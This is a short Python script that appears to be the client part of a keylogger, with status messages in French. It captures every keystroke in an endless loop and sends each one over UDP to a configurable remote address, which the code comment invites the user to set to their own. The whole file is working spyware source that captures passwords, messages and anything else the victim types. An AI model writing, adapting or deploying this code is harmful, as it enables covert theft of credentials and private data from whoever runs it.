from keyboard import read_key
import socket



class Client():
    def __init__(self):
        self.ip = socket.gethostbyname(socket.gethostname())
        self.host = 'localhost'         # CHANGE WITH YOUR ADDRESS
        self.port = 12345
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def connect(self):
        self.client.connect((self.host, self.port))

    def record(self):
        try:
            self.connect()
        except ConnectionRefusedError:
            print("Erreur de réseau veuillez relancer le programme.")

        print('########### \n Connexion avec serveur établie \n ###########')
        k = None
        while True:
            k = read_key()
            self.client.send(k.encode('utf-8'))


c1 = Client()
c1.record()